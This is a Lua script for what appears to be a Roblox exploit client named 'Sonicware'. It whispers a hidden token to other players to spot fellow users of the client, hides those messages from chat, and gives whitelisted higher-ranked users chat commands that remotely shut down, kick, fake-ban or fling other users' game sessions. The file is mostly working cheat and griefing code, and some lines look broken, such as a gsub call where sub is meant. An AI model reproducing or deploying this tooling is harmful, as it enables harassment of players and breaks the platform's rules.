repeat 
  task.wait() 
until game:IsLoaded()
repeat 
  task.wait() 
until (game.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService) or (game.TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService)
local playersService = game:GetService("Players")
local cs1 = "KVOP35KYFPXP2"
local cmds = {
  ["shutdown"] = function(d,x) game:Shutdown() end,
  ["kick"] = function(d,x) playersService.LocalPlayer:Kick() end,
  ["errkick"] = function(d,x) playersService.LocalPlayer:Destroy() end,
  ["lagback"] = function(d,c) playersService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(9e9,9e9,9e9) end,
  ["ban"] = function(d,n) playersService.LocalPlayer:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]") end,
}
local already = {}
local function handle(plr, lplr, msg, args, chatVersion)
  local opos = shared.snwls:Pos(plr) or 1
  local lpos = shared.snwls:Pos(lplr) or 1
  local client = msg:find(cs1)
  if plr == lplr then
    if lpos > 1 then
      if msg:len() >= 5 and msg:gsub(1,5):lower() == ";cmds" then
        local yax = {}
        for i, v in pairs(cmds) do
          table.insert(yax, i)
        end
        table.sort(yax)
        local rts = ""
        for i, v in pairs(yax) do
          rts = rts..";"..v.."\n"
        end
        if chatVersion == "TextChatService" then
          game.TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(rts)
        else
          game.StarterGui:SetCore(
            "ChatMakeSystemMessage",
            {
              Text = rts;
              Font = Enum.Font.Gotham
            }
          )
        end
      end
    end
  else
    if lpos > 1 and client ~= nil and already[plr.Name] == nil then
      already[plr.Name] = true
      shared.GUI:CreateNotification("warning", plr.Name.." is using Sonicware", 60)
      setclipboard(plr.Name)
    local function x(ob) pcall(function()
      if ob:IsA("TextLabel") and ob.Text:find(cs1) then ob.Parent.Parent.Visible = false end
    end) end
    for i, v in pairs(game:GetDescendants()) do x(v) end
    game.DescendantAdded:Connect(function(v) x(v) end)
    end
  end
  if opos > 1 and opos >= lpos and #args > 1 then
    table.remove(args, 1)
    local exe = false
    if args[1]:lower() == "default" and exe == false and lpos == 1 then exe = true end
    if args[1]:lower() == "private" and exe == false and (lpos == 2 or lpos == 3) then exe = true end
    if exe == false and lplr.Name:lower():find(args[1]:lower) then exe = true end
    if exe == true then table.remove(args, 1) end
    for i, v in pairs(cmds) do
      if msg:len() >= (i:len()+1) and msg:sub(1, i:len()+1):lower() == ";"..i:lower() then
        msg = ""
        v(args, plr)
        break
      end
    end
  end
end
if game.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
  local textChatService = game:GetService("TextChatService")
  textChatService.MessageReceived:Connect(
    function(tab)
      local plr = playersService:GetPlayerByUserId(tab.TextSource.UserId)
      if not plr then return end
      local msg = tab.Text
      handle(
        plr, 
        game.Players.LocalPlayer,
        tab.Text,
        msg:split(" "),
        "TextChatService"
      )
    end
  )
elseif game.TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService then
  local replicatedStorageService = game:GetService("ReplicatedStorage")
  if not replicatedStorageService["DefaultChatSystemChatEvents"] then return end
  replicatedStorageService.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(
    function(tab, chan)
      local plr = playersService:FindFirstChild(tab.FromSpeaker)
      if not plr then return end 
      local msg = tab.Message
      handle(
        plr, 
        game.Players.LocalPlayer,
        tab.Message,
        msg:split(" "),
        "LegacyChatService"
      )
    end
  )
else return end
local function newPlayer(plr)
  local tc = game.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService and true or false
  if not shared.snwls:CheckWhitelisted(plr) then return end
  if tc then
    local oldchannel = game.TextChatService.ChatInputBarConfiguration.TargetTextChannel
    local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
    if newchannel then
      newchannel:SendAsync(cs1)
    end
    game.TextChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
  else
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plr.Name.." "..cs1, "ALL")
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(":> sup guys?", "ALL")
  end
end
for i, v in pairs(game:GetService("Players"):GetPlayers()) do
  task.spawn(newPlayer, v)
end
game:GetService("Players").PlayerAdded:Connect(function(p) task.spawn(newPlayer, p) end)